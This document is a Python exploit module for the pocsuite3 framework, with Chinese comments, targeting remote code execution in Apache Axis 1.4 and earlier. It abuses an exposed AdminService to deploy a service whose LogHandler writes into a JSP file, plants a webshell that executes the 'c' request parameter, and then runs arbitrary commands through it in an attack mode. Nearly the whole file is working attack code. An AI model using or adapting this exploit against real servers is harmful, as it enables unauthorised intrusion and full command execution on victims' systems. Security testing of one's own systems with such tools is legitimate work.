#!/usr/bin/env python
#coding=utf-8

import random
import json
import time
from string import ascii_letters
import threading
import uuid
import subprocess
import os
from urllib.parse import urlparse
from collections import OrderedDict
import socket
# 将输入的url转换为ip:port，供socket使用
from pocsuite3.lib.utils import url2ip
from pocsuite3.api import logger
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase, logger, OptDict
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


'''
需要允许远程访问 AdminService端口(server-config.wsdd文件开启enableRemoteAdmin)
默认是没有server-config.wsdd文件的，默认的未授权远程访问也是关闭的，需要去这里下载一个：
https://github.com/apache/axis-axis1-java/blob/master/axis-war/src/main/webapp/WEB-INF/server-config.wsdd
然后修改enableRemoteAdmin值为true
'''
class Axis_RCE_POC(POCBase):
    vulID = 'Axis-RCE'
    appName = 'Axis'
    appVersion = 'Apache Axis <=1.4'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2019-06-16'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-05-13'  # 编写 PoC 的日期
    updateDate = '2021-04-21'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://www.gdcert.com.cn/index/news_detail/W1BZRDEYCh0cDRkcGw']  # 漏洞地址来源,0day不用写
    name = 'Axis-RCE'  # PoC 名称
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"

    
    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
    BANNER = ''.join([random.choice(ascii_letters) for i in range(10)])


    def _verify(self, p_cmd=''):
        result={}

        # 例：http://cqq.com:8088/axis
        vul_url = self.url

        host, port = url2ip(vul_url, True)

        logger.info("检查端口开放情况...")
        # 端口都不开放就不浪费时间了
        if not self.is_port_open(host, port):
            logger.info("端口不开放! 退出!")
            return

        logger.info("端口开放... 继续") 
        target_url = vul_url

        admin_service_url = "/services/AdminService"
        random_service_url = "/services/RandomService"
        
        # 获取相对路径 /axis
        relative_path = self.get_relative_path(vul_url)

        webshell_path = "shell_{0}.jsp".format(self.BANNER)

        default_cmd = "echo%20{0}".format(self.BANNER)

        url1 = vul_url + admin_service_url
        url2 = vul_url + random_service_url
        url3 = ''

        if p_cmd:    # attack模式
            url3 = vul_url + "/" + webshell_path + "?c=" + p_cmd
        else:        # verify模式
            url3 = vul_url + "/" + webshell_path + "?c=" + default_cmd
        print(url3)

        headers = {
            "Connection": "close", 
            "Content-Type": "application/xml",
            "SOAPAction": ""    # 这个请求头是必须带上的
        }


        payload1 = self.get_payload1(relative_path, webshell_path)
        payload2 = self.get_payload2()

        resp3 = None
        
        try:
            resp1 = req.post(url1, data=payload1, headers=headers, timeout=5)   #,  proxies={'http': 'http://127.0.0.1:8087'}) #, proxies={'http': 'http://127.0.0.1:8087'})
            if resp1.status_code == 200:
                resp2 = req.post(url2, data=payload2, headers=headers, timeout=5)    #,  proxies={'http': 'http://127.0.0.1:8087'})
                if resp2.status_code == 500:
                    resp3 = req.get(url3, timeout=5)    #,  proxies={'http': 'http://127.0.0.1:8087'})


        except Exception as e:
            print(e)
            raise e
            #traceback.print_stack()
        
        if p_cmd:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Response'] = resp3.text
            return self.save_output(result)
        elif self.BANNER in resp3.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target_url
            result['VerifyInfo']['Payload'] = payload1
            result['VerifyInfo']['Payload2'] = payload2
            result['VerifyInfo']['Response'] = resp3.text
            return self.save_output(result)
        return self.save_output(result)


    def is_port_open(self, p_host, p_port):
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(2)
        try:
            sk.connect((p_host, p_port))
            print('Server port is OK!')
        except Exception as e:    # 碰到异常认为端口未开放，返回False
            return False
        
        sk.close()
        # 没问题就返回True
        return True
          


    def get_relative_path(self, url):
        urldic = urlparse(url)

        pathdict = urldic.path.split('/')
 
        print(pathdict[1])
        return pathdict[1]

    '''
    指定webshell路径和Service的名字
    '''
    def get_payload1(self, p_relative_path, p_webshell_path):
        random_service = "RandomService"
        webshell_path = "webapps/{0}/{1}".format(p_relative_path, p_webshell_path)
        xml = '''<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <ns1:deployment
  xmlns="http://xml.apache.org/axis/wsdd/"
  xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
  xmlns:ns1="http://xml.apache.org/axis/wsdd/">
  <ns1:service name="{0}" provider="java:RPC">
    <requestFlow>
      <handler type="RandomLog"/>
    </requestFlow>
    <ns1:parameter name="className" value="java.util.Random"/>
    <ns1:parameter name="allowedMethods" value="*"/>
  </ns1:service>
  <handler name="RandomLog" type="java:org.apache.axis.handlers.LogHandler" >  
    <parameter name="LogHandler.fileName" value="{1}" />   
    <parameter name="LogHandler.writeToConsole" value="false" /> 
  </handler>
</ns1:deployment>
  </soapenv:Body>
</soapenv:Envelope>
        '''.format(random_service, webshell_path)

        return xml


    '''
    指定webshell内容
    '''
    def get_payload2(self):
        webshell_content = '<%@page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%>'
        xml = '''<?xml version="1.0" encoding="utf-8"?>
        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
        <api:main
        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <api:in0><![CDATA[
{0}]]>
            </api:in0>
        </api:main>
  </soapenv:Body>
</soapenv:Envelope>
        '''.format(webshell_content)

        return xml


    # 攻击模块
    # 参考：https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/pocs/ecshop_rce.py
    def _attack(self):
        cmd = self.get_option("command")
        result = dict()
        result['Stdout'] = self._verify(cmd)
        return self.save_output(result)



    def _options(self):
        o = OrderedDict()
        o["command"] = OptDict(selected="bash")
        return o


    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
            output.show_result()
        else:
            output.fail()
        return output


# 注册类
register_poc(Axis_RCE_POC)
